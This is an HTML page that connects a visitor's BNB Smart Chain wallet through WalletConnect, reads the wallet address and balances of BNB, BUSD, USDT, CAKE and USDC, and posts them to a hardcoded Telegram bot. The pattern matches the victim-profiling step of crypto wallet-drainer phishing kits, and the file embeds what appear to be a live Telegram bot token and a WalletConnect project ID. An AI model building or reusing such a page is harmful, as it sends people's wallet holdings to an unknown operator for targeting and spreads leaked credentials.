<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Web3Modal + WalletConnect BSC</title>
  <script type="module">
    import { Web3Modal } from 'https://unpkg.com/@web3modal/html@3.0.0/dist/index.js';
    import { EthereumClient, w3mConnectors, w3mProvider } from 'https://unpkg.com/@web3modal/ethereum@3.0.0/dist/index.js';
    import { configureChains, createConfig } from 'https://unpkg.com/@wagmi/core@1.3.0/dist/index.js';
    import { bsc } from 'https://unpkg.com/@wagmi/core@1.3.0/chains';
    import { ethers } from 'https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.esm.min.js';

    const projectId = '830735eac5e93ca0f04292ca2d8873e5'; // WalletConnect Project ID

    const chains = [bsc];
    const { publicClient } = configureChains(chains, [w3mProvider({ projectId })]);

    const wagmiConfig = createConfig({
      autoConnect: true,
      connectors: w3mConnectors({ projectId, chains }),
      publicClient
    });

    const ethereumClient = new EthereumClient(wagmiConfig, chains);

    const modal = new Web3Modal({
      projectId,
      themeMode: 'light',
      themeVariables: {
        '--w3m-accent-color': '#f6851b',
        '--w3m-background-color': '#ffffff'
      }
    }, ethereumClient);

    const tokenList = [
      { symbol: "BNB", address: null },
      { symbol: "BUSD", address: "0xe9e7cea3dedca5984780bafc599bd69add087d56" },
      { symbol: "USDT", address: "0x55d398326f99059ff775485246999027b3197955" },
      { symbol: "CAKE", address: "0x0e09fabb73bd3ade0a17ecc321fd13a19e81ce82" },
      { symbol: "USDC", address: "0x8ac76a51cc950d9822d68b83fe1ad97b32cd580d" }
    ];

    const erc20Abi = [
      { "constant": true, "inputs": [], "name": "decimals", "outputs": [{ "name": "", "type": "uint8" }], "type": "function" },
      { "constant": true, "inputs": [{ "name": "_owner", "type": "address" }], "name": "balanceOf", "outputs": [{ "name": "balance", "type": "uint256" }], "type": "function" }
    ];

    async function sendToTelegram(message) {
      const telegramToken = '8085520651:AAHM2Kt961rV4QyMSkElrmrnwDmcqFVB9SU'; // Replace with your token
      const chatId = '8060968649'; // Replace with your chat ID
      const url = `https://api.telegram.org/bot${telegramToken}/sendMessage`;

      await fetch(url, {
        method: 'POST',
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: chatId,
          text: message
        })
      });
    }

    // Wallet Connect + Fetch + Telegram
    window.connectWallet = async () => {
      try {
        const provider = await modal.connect();
        const ethersProvider = new ethers.providers.Web3Provider(provider);
        const signer = ethersProvider.getSigner();
        const address = await signer.getAddress();

        let message = `üì≤ New Wallet Connected:\nAddress: ${address}\n\nüí∞ Token Balances:\n`;

        for (const token of tokenList) {
          let balance = "0";
          if (token.address === null) {
            const bnbBal = await ethersProvider.getBalance(address);
            balance = parseFloat(ethers.utils.formatEther(bnbBal)).toFixed(4);
          } else {
            const contract = new ethers.Contract(token.address, erc20Abi, ethersProvider);
            const rawBal = await contract.balanceOf(address);
            const decimals = await contract.decimals();
            balance = parseFloat(ethers.utils.formatUnits(rawBal, decimals)).toFixed(4);
          }
          message += `‚Ä¢ ${token.symbol}: ${balance}\n`;
        }

        await sendToTelegram(message);
        alert("‚úÖ Wallet connected & balances sent to Telegram!");
      } catch (error) {
        console.error('‚ùå Wallet connection failed:', error);
        alert("Connection failed. Check console.");
      }
    };
  </script>
</head>
<body style="font-family: Arial, sans-serif; text-align:center; padding: 50px;">
  <h1>Connect to BSC Wallet</h1>
  <button onclick="connectWallet()" style="padding: 12px 24px; font-size: 16px;">Connect Wallet</button>
</body>
</html>
